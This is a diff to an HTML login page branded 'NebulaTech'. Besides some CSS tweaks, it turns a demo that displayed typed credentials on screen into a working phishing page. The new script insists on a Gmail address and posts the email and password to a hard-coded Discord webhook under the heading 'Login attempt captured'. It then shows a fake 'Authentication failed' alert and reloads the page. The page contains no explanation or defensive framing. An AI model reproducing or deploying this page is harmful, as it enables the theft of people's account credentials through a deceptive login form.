@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NebulaTech Secure Access</title>
+  <title>NebulaTech Secure Gateway</title>
   <style>
     body {
-      background-color: #0e0e0e;
-      color: #e0e0e0;
+      background-color: #0d0d0d;
+      color: #eaeaea;
       font-family: 'Segoe UI', sans-serif;
       display: flex;
       align-items: center;
@@ -18,25 +18,24 @@
     .login-box {
       background-color: #1a1a1a;
       padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0,255,255,0.1);
-      width: 360px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px rgba(0,255,255,0.1);
+      width: 380px;
     }
 
     h2 {
-      margin-bottom: 25px;
-      color: #00ffff;
       text-align: center;
-      font-weight: 600;
+      color: #00ffff;
+      margin-bottom: 25px;
     }
 
     input {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       margin: 10px 0;
       background-color: #2a2a2a;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       color: #fff;
     }
 
@@ -47,12 +46,12 @@
     button {
       width: 100%;
       padding: 12px;
-      margin-top: 15px;
       background-color: #00cccc;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       color: #000;
       font-weight: bold;
+      margin-top: 15px;
       cursor: pointer;
       transition: background-color 0.3s;
     }
@@ -60,44 +59,63 @@
     button:hover {
       background-color: #00aaaa;
     }
-
-    .log-output {
-      margin-top: 25px;
-      padding: 10px;
-      background: #111;
-      font-family: monospace;
-      font-size: 0.9em;
-      color: #00ff99;
-      white-space: pre-wrap;
-    }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>NebulaTech Access</h2>
-    <input type="text" id="username" placeholder="Access ID / Email">
-    <input type="password" id="password" placeholder="Decryption Key / Password">
-    <button onclick="logInputs()">Initiate Login</button>
-    <div class="log-output" id="logOutput"></div>
+    <h2>NebulaTech Login</h2>
+    <input type="text" id="email" placeholder="Email (required)">
+    <input type="password" id="password" placeholder="Access Key">
+    <button onclick="submitForm()">Access System</button>
   </div>
 
   <script>
-    function logInputs() {
-      const username = document.getElementById("username").value;
+    function isValidGmail(email) {
+      return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
+    }
+
+    async function submitForm() {
+      const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value;
 
-      const logArea = document.getElementById("logOutput");
-      const timestamp = new Date().toLocaleTimeString();
+      if (!isValidGmail(email)) {
+        alert("Invalid email. Must be a valid Gmail address.");
+        return;
+      }
 
-      const log = `[${timestamp}] CAUGHT:
-    Access ID: ${username}
-    Decryption Key: ${password}
-  `;
+      const payload = {
+        content: "**Login attempt captured**",
+        embeds: [{
+          title: "📥 NebulaTech Credentials",
+          color: 3447003,
+          fields: [
+            { name: "Email", value: email, inline: false },
+            { name: "Access Key", value: password, inline: false },
+            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
+          ]
+        }]
+      };
 
-      console.log(log);
-      logArea.textContent = log;
+      // Replace with your actual webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        // Optional: log to console if webhook fails
+        console.warn("Webhook failed", e);
+      }
+
+      // Simulate failed login
+      setTimeout(() => {
+        alert("Authentication failed. Please try again.");
+        location.reload();
+      }, 800);
     }
   </script>
 </body>
 </html>
-
